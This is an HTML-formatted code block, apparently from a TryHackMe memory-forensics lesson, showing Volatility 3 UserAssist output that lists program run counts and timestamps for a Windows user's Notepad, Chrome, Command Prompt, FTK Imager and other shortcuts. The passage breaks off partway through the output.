<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme$ </span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> userassist.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Volatility </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> Framework </span><span class="token number" style="color:#36acaa">2.26</span><span class="token plain">.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hive Offset    Hive Name    Path    Last Write Time    Type    Name    ID    Count    Focus Count    Time Focused    Last Updated    Raw Data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xbe8c6878d000    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">operator</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ntuser.dat    ntuser.dat</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SOFTWARE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">CurrentVersion</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Explorer</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">UserAssist</span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">9E04CAB2-CC14-11DF-BB8C-A2F1DED72085</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Count    </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-04-30 05:44:06.000000 UTC    Key    N/A    N/A    N/A    N/A    N/A    N/A    N/A</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%ALLUSERSPROFILE%</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Start Menu</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Programs</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Accessories</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Notepad.lnk    N/A    </span><span class="token number" style="color:#36acaa">6</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00:00.506000    </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 06:55:48.000000 UTC    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 06 00 00 00 00 00 00 00 06 00 00 00 </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf ff ff ff ff </span><span class="token number" style="color:#36acaa">50</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">30</span><span class="token plain"> 5b </span><span class="token number" style="color:#36acaa">10</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">P0</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1d bf db 01 00 00 00 00                         </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* 0xbe8c6878d000    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">operator</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ntuser.dat    ntuser.dat</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SOFTWARE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">CurrentVersion</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Explorer</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">UserAssist</span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">F4E57C4B-2036-45F0-A9AB-443BCFE33D9F</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Count    </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:15:27.000000 UTC    Value    C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Public</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Desktop</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Google Chrome.lnk    N/A    </span><span class="token number" style="color:#36acaa">9</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00:00.509000    </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 06:58:07.000000 UTC    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 09 00 00 00 00 00 00 00 09 00 00 00 </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf ff ff ff ff a0 </span><span class="token number" style="color:#36acaa">82</span><span class="token plain"> 5b </span><span class="token number" style="color:#36acaa">63</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1d bf db 01 00 00 00 00                         </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* 0xbe8c6878d000    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">operator</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ntuser.dat    ntuser.dat</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SOFTWARE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">CurrentVersion</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Explorer</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">UserAssist</span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">F4E57C4B-2036-45F0-A9AB-443BCFE33D9F</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Count    </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:15:27.000000 UTC    Value    %APPDATA%</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Start Menu</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Programs</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System Tools</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Command Prompt.lnk    N/A    </span><span class="token number" style="color:#36acaa">33</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00:00.533000    </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:12:43.000000 UTC    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 </span><span class="token number" style="color:#36acaa">21</span><span class="token plain"> 00 00 00 00 00 00 00 </span><span class="token number" style="color:#36acaa">21</span><span class="token plain"> 00 00 00 </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token operator" style="color:#393A34">!</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><span class="token operator" style="color:#393A34">!</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf ff ff ff ff </span><span class="token number" style="color:#36acaa">20</span><span class="token plain"> ce 3d 6d </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"> .</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1f bf db 01 00 00 00 00                         </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* 0xbe8c6878d000    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">operator</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ntuser.dat    ntuser.dat</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SOFTWARE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">CurrentVersion</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Explorer</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">UserAssist</span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">F4E57C4B-2036-45F0-A9AB-443BCFE33D9F</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Count    </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:15:27.000000 UTC    Value    %APPDATA%</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Internet Explorer</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Quick Launch</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">User Pinned</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">TaskBar</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">File Explorer.lnk    N/A    </span><span class="token number" style="color:#36acaa">28</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00:00.528000    </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:11:17.000000 UTC    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 1c 00 00 00 00 00 00 00 1c 00 00 00 </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf ff ff ff ff </span><span class="token number" style="color:#36acaa">70</span><span class="token plain"> ed 3d 3a </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">p.</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1f bf db 01 00 00 00 00                         </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* 0xbe8c6878d000    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">operator</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ntuser.dat    ntuser.dat</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SOFTWARE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">CurrentVersion</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Explorer</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">UserAssist</span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">F4E57C4B-2036-45F0-A9AB-443BCFE33D9F</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Count    </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:15:27.000000 UTC    Value    C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Public</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Desktop</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">AccessData FTK Imager.lnk    N/A    </span><span class="token number" style="color:#36acaa">6</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00:00.506000    </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:15:27.000000 UTC    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 06 00 00 00 00 00 00 00 06 00 00 00 </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf 00 00 </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> bf ff ff ff ff </span><span class="token number" style="color:#36acaa">20</span><span class="token plain"> be be ce </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1f bf db 01 00 00 00 00                         </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* 0xbe8c6878d000    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">operator</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ntuser.dat    ntuser.dat</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SOFTWARE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">CurrentVersion</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Explorer</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">UserAssist</span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">F4E57C4B-2036-45F0-A9AB-443BCFE33D9F</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Count    </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:15:27.000000 UTC    Value    %ALLUSERSPROFILE%</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Start Menu</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Programs</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Word.lnk    N/A    </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00:00.500000    N/A    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 9a </span><span class="token number" style="color:#36acaa">94</span><span class="token plain"> ce bf 00 00 00 00 00 00 00 00 </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span 